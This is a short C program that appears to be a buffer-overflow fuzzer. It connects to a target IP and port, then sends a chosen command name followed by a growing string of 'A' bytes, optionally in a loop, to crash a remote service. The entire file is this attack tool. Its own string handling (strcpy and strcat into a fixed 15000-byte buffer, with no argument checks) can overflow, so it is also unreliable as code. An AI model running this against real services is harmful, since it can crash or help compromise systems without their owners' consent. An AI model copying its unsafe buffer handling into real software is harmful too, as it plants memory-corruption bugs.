#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <errno.h>
#define MAX_BUFFER_SIZE 15000 // Define a constant for maximum buffer size

int main(int argc, char **argv) {
    char buffer[MAX_BUFFER_SIZE];
    int bufferSize = atoi(argv[3]);
    char payload[MAX_BUFFER_SIZE];
    int loopCounter = 0;
    int bufferLength = 0;

    do {
        /* In this section, if the loop runs more than once, the bufferSize size will increase 100 times each loop. */
        if (loopCounter >= 1) {
            bufferSize += 100;
            if (bufferSize > MAX_BUFFER_SIZE) {
                /* If the buffersize size exceeds 15000, the program will end. */
                return EXIT_FAILURE;
            }
        }
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd == -1) {
            break;
        }
        struct sockaddr_in server;
        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(argv[2]));

        if (inet_pton(AF_INET, argv[1], &server.sin_addr) == -1) {
            break;
        }

        if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) {
            break;
        }
        /* In this section, the payload variable is filled with 'A' as much as the size of bufferSize. */
        memset(payload, 'A', bufferSize);
        payload[bufferSize - 1] = '\0'; /* Adding '\0' to the end of the payload string. */
        strcpy(buffer, argv[5]); /* argv[5] contains the VULN NAME the user entered. */
        strcat(buffer, payload);
        bufferLength = strlen(buffer);
        if (write(sockfd, buffer, bufferLength) == -1) {
            break;
        }
        loopCounter++;
    } while (strcmp(argv[4], "y") == 0);
    printf("%d", bufferLength);
    return EXIT_SUCCESS;
}